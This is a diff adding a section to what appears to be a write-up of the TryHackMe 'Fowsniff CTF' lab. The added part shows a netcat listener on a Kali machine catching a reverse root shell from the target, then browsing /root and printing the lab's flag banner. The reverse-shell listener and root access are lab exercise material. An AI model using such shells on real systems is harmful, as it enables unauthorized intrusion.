@@ -862,6 +862,70 @@ connect to [192.168.134.50] from (UNKNOWN) [10.82.154.253] 50018
 # whoami
 root
 ```
+
+```
+┌──(kali㉿kali)-[~/ET/THM/Fowsniff CTF]
+└─$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.134.50] from (UNKNOWN) [10.82.154.253] 50022
+/bin/sh: 0: can't access tty; job control turned off
+# ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+# cd root
+# ls
+Maildir
+flag.txt
+# cat flag.txt  
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&&&&&&&&&&&&&&|
+  |    R O O T   |
+  |    F L A G   |
+  |&&&&&&&&&&&&&&|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+
+# 
+```
 <div>
 <br>
 <br>
